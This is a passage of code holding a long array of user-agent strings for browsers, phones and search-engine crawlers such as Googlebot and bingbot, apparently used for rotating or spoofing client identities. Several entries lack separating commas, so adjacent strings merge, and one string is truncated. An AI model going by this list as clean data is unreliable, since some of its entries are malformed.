	"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
	"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
	"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
 			"Googlebot-Image/1.0",
			"Googlebot-News",
			"Googlebot-Video/1.0",
			"Gregarius/0.5.2 ( http://devlog.gregarius.net/docs/ua)",
			"grub-client-1.5.3; (grub-client-1.5.3; Crawl your own stuff with http://grub.org)",
			"Gulper Web Bot 0.2.4 (www.ecsl.cs.sunysb.edu/~maxim/cgi-bin/Link/GulperBot)",
			"HTC_Dream Mozilla/5.0 (Linux; U; Android 1.5; en-ca; Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"HTC-ST7377/1.59.502.3 (67150) Opera/9.50 (Windows NT 5.1; U; en) UP.Link/6.3.1.17.0",
			"HTMLParser/1.6",
			"iTunes/4.2 (Macintosh; U; PPC Mac OS X 10.2)",
			"iTunes/9.0.2 (Windows; N)",
                        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
			"iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)",
			"Java/1.6.0_13",
			"Jigsaw/2.2.5 W3C_CSS_Validator_JFouffa/2.0",
			"Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)",
			"LG-GC900/V10a Obigo/WAP2.0 Profile/MIDP-2.1 Configuration/CLDC-1.1",
			"LG-LX550 AU-MIC-LX550/2.0 MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
			"libwww-perl/5.820",
			"Links/0.9.1 (Linux 2.4.24; i386;)",
			"Links (2.1pre15; FreeBSD 5.3-RELEASE i386; 196x84)",
			"Links (2.1pre15; Linux 2.4.26 i686; 158x61)",
			"Links (2.3pre1; Linux 2.6.38-8-generic x86_64; 170x48)",
			"Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.12",
			"Lynx/2.8.7dev.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d",
			"Mediapartners-Google",
			"Microsoft URL Control - 6.00.8862",
			"Midori/0.1.10 (X11; Linux i686; U; en-us) WebKit/(531).(2) ",
			"MOT-L7v/08.B7.5DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
			"MOTORIZR-Z8/46.00.00 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 356) Opera 8.65 [it] UP.Link/6.3.0.0.0",
			"MOT-V177/0.1.75 UP.Browser/6.2.3.9.c.12 (GUI) MMP/2.0 UP.Link/6.3.1.13.0",
			"MOT-V9mm/00.62 UP.Browser/6.2.3.4.c.1.123 (GUI) MMP/2.0",
			"Mozilla/1.22 (compatible; MSIE 5.01; PalmOS 3.0) EudoraWeb 2.1",
			"Mozilla/2.02E (Win95; U)",
			"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)",
			"Mozilla/3.01Gold (Win95; I)",
			"Mozilla/3.0 (compatible; NetPositive/2.1.1; BeOS)",
			"Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)",
			"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.0 (screen 600x800)",
			"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; MDA Pro/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1)",
			"Mozilla/4.0 (compatible; MSIE 5.0; Series80/2.0 Nokia9500/4.51 Profile/MIDP-2.0 Configuration/CLDC-1.1)",
			"Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
			"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)",
			"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0 )",
			"Mozilla/4.0 (compatible; MSIE 6.0; j2me) ReqwirelessWeb/3.5",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/hspr-H102; Blazer/4.0) 16;320x320",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.12; Microsoft ZuneHD 4.3)",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0",
			"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; winfx; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Zune 2.0) ",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0) Asus;Galaxy6",
			"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
			"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
			"Mozilla/4.0 (PDA; PalmOS/sony/model prmr/Revision:1.1.54 (en)) NetFront/3.0",
			"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
			"Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 6600;452) Opera 6.20 [en-US]",
			"Mozilla/4.77 [en] (X11; I; IRIX;64 6.5 IP30)",
			"Mozilla/4.8 [en] (Windows NT 5.1; U)",
 			"Mozilla/4.8 [en] (X11; U; SunOS; 5.7 sun4u)",
			"Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
                       "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
              "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
              "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
              "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
              "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
              "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
              "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
              "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
            "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
            "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
            "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
            "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
            "HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
 			"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20060702 SeaMonkey/1.5a",
			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1  (KHTML, Like Gecko) Version/6.0.0.141 Mobile Safari/534.1",
			"Mozilla/5.0 (compatible; bingbot/2.0  http://www.bing.com/bingbot.htm)",
			"Mozilla/5.0 (compatible; Exabot/3.0;  http://www.exabot.com/go/robot) ",
			"Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19"
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.36 Safari/525.19"
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10"
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20050923 CentOS/1.0.7-1.4.1.centos4 Firefox/1.0.7"
 			"Mozilla/5.0 (compatible; Konqueror/3.3; Linux 2.6.8-gentoo-r3; X11;",
			"Mozilla/5.0 (compatible; Konqueror/3.5; Linux 2.6.30-7.dmz.1-liquorix-686; X11) KHTML/3.5.10 (like Gecko) (Debian package 4:3.5.10.dfsg.1-1 b1)",
			"Mozilla/5.0 (compatible; Konqueror/3.5; Linux; en_US) KHTML/3.5.6 (like Gecko) (Kubuntu)",
			"Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/3.5; SunOS) KHTML/3.5.1 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.1; DragonFly) KHTML/4.1.4 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.1; OpenBSD) KHTML/4.1.4 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.2; Linux) KHTML/4.2.4 (like Gecko) Slackware/13.0",
			"Mozilla/5.0 (compatible; Konqueror/4.3; Linux) KHTML/4.3.1 (like Gecko) Fedora/4.3.1-3.fc11",
			"Mozilla/5.0 (compatible; Konqueror/4.4; Linux 2.6.32-22-generic; X11; en_US) KHTML/4.4.3 (like Gecko) Kubuntu",
			"Mozilla/5.0 (compatible; Konqueror/4.4; Linux) KHTML/4.4.1 (like Gecko) Fedora/4.4.1-1.fc12",
			"Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.5; NetBSD 5.0.2; X11; amd64; en_US) KHTML/4.5.4 (like Gecko)",
			"Mozilla/5.0 (compatible; Konqueror/4.5; Windows) KHTML/4.5.4 (like Gecko)",
			"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
			"Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
			"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/5.0)",
			"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/5.0)",
			"Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
			"Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)",
			"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
			"Mozilla/5.0 (en-us) AppleWebKit/525.13 (KHTML, like Gecko; Google Web Preview) Version/3.1 Safari/525.13",
			"Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.2; U; de-DE) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/234.40.1 Safari/534.6 TouchPad/1.0",
			"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
			"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
			"Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5A347 Safari/525.200",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/531.22.7",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; da-dk) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190",
			"Mozilla/5.0 (iPhone; U; CPU iPhone OS) (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
			"Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420  (KHTML, like Gecko) Version/3.0 Mobile/1A543a Safari/419.3",
			"Mozilla/5.0 (iPod; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11a Safari/525.20",
			"Mozilla/5.0 (iPod; U; CPU iPhone OS 3_1_1 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Mobile/7C145",
			"Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522  (KHTML, like Gecko) Safari/419.3",
			"Mozilla/5.0 (Linux; U; Android 1.0; en-us; dream) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
			"Mozilla/5.0 (Linux; U; Android 1.1; en-gb; dream) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
			"Mozilla/5.0 (Linux; U; Android 1.5; de-ch; HTC Hero Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; de-de; Galaxy Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; de-de; HTC Magic Build/PLAT-RC33) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 FirePHP/0.3",
			"Mozilla/5.0 (Linux; U; Android 1.5; en-gb; T-Mobile_G2_Touch Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; en-us; htc_bahamas Build/CRB17) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; en-us; sdk Build/CUPCAKE) AppleWebkit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; en-us; SPH-M900 Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; en-us; T-Mobile G1 Build/CRB43) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari 525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.5; fr-fr; GT-I5700 Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.6; en-us; HTC_TATTOO_A3288 Build/DRC79) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.6; en-us; SonyEricssonX10i Build/R1AA056) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 1.6; es-es; SonyEricssonX10i Build/R1FA016) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
			"Mozilla/5.0 (Linux; U; Android 2.0.1; de-de; Milestone Build/SHOLS_U2_01.14.0) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.0; en-us; Droid Build/ESD20) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.0; en-us; Milestone Build/ SHOLS_U2_01.03.1) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.1; en-us; HTC Legend Build/cupcake) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.1-update1; de-de; HTC Desire 1.19.161.5 Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
			"Mozilla/5.0 (Linux; U; Android 2.2; en-ca; GT-P1000M Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 2.2; en-us; ADR6300 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Sprint APA9292KT Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; BNTV250 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
			"Mozilla/5.0 (Linux; U; Android 3.0.1; en-us; GT-P7100 Build/HRI83) AppleWebkit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
			"Mozilla/5.0 (Linux; U; Android 3.0.1; fr-fr; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
			"Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
			"Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
			"Mozilla/5.0 (Linux; U; Android 4.0.3; de-de; Galaxy S II Build/GRJ22) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
			"Mozilla/5.0 (Linux U; en-US)  AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) Version/4.0 Kindle/3.0 (screen 600x800; rotate)",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Camino/2.2.1",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre Camino/2.2a1pre",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1) Gecko/20090624 Firefox/3.5",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-us) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; de-de) AppleWebKit/534.15  (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-us) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.14) Gecko/20110218 AlexaToolbar/alxf-2.0 Firefox/3.6.14",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7; en-us) AppleWebKit/534.20.8 (KHTML, like Gecko) Version/5.1 Safari/534.20.8",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0.112941",
			"Mozilla/5.0 (Macintosh; U; Mac OS X Mach-O; en-US; rv:2.0a) Gecko/20040614 Firefox/3.0.0 ",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.3) Gecko/2008092414 Firefox/3.0.3",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/125.8",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/85.8",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko) Safari/419.3",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.15",
			"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/312.5 (KHTML, like Gecko) Safari/312.3",
			"Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
			"Mozilla/5.0 (Maemo; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (MeeGo; NokiaN950-00/00) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13",
			"Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13",
			"Mozilla/5.0 (PLAYSTATION 3; 1.10)",
			"Mozilla/5.0 (PLAYSTATION 3; 2.00)",
			"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC6-01/011.010; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.2 3gpp-gba",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC7-00/012.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE6-00/021.002; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.16 Mobile Safari/533.4 3gpp-gba",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE7-00/010.016; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/014.002; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.4 3gpp-gba",
			"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaX7-00/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.21 Mobile Safari/533.4 3gpp-gba",
			"Mozilla/5.0 (SymbianOS/9.1; U; de) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
			"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
			"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es50",
			"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es65",
			"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es70",
			"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia5700/3.27; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
			"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia6120c/3.70; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
			"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE90-1/07.24.0.3; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.2.3.18.0",
